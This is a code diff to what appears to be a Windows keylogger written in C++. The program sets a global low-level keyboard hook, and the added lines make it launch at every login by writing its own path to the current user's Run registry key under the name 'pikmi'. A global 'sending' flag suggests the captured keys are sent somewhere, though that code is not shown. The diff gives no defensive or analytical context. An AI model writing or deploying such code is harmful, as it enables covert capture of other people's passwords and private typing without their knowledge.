@@ -5,6 +5,14 @@
 #include <deque>
 #include <algorithm>
 
+extern "C" int WINAPI WinMain(HINSTANCE hInstance, 
+                             HINSTANCE hPrevInstance, 
+                             LPSTR lpCmdLine, 
+                             int nCmdShow)
+{
+    return wWinMain(hInstance, hPrevInstance, (PWSTR)lpCmdLine, nCmdShow);
+}
+
 HHOOK hook = nullptr;
 bool sending = false;
 
@@ -69,7 +77,24 @@ LRESULT CALLBACK keyboardProc(int code, WPARAM wParam, LPARAM lParam) {
     return CallNextHookEx(hook, code, wParam, lParam);
 }
 
+void AddToStartup() {
+    HKEY hKey;
+    const wchar_t* appName = L"pikmi";
+    wchar_t path[MAX_PATH];
+    GetModuleFileNameW(NULL, path, MAX_PATH);
+
+    if (RegOpenKeyExW(HKEY_CURRENT_USER, 
+                     L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
+                     0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
+        RegSetValueExW(hKey, appName, 0, REG_SZ, 
+                      (const BYTE*)path, 
+                      (wcslen(path) + 1) * sizeof(wchar_t));
+        RegCloseKey(hKey);
+    }
+}
+
 int WINAPI wWinMain(HINSTANCE, HINSTANCE, PWSTR, int) {
+    AddToStartup(); 
     hook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardProc, nullptr, 0);
     if (!hook) return 1;
     MSG msg;
@@ -79,4 +104,5 @@ int WINAPI wWinMain(HINSTANCE, HINSTANCE, PWSTR, int) {
     }
     UnhookWindowsHookEx(hook);
     return 0;
+
 }
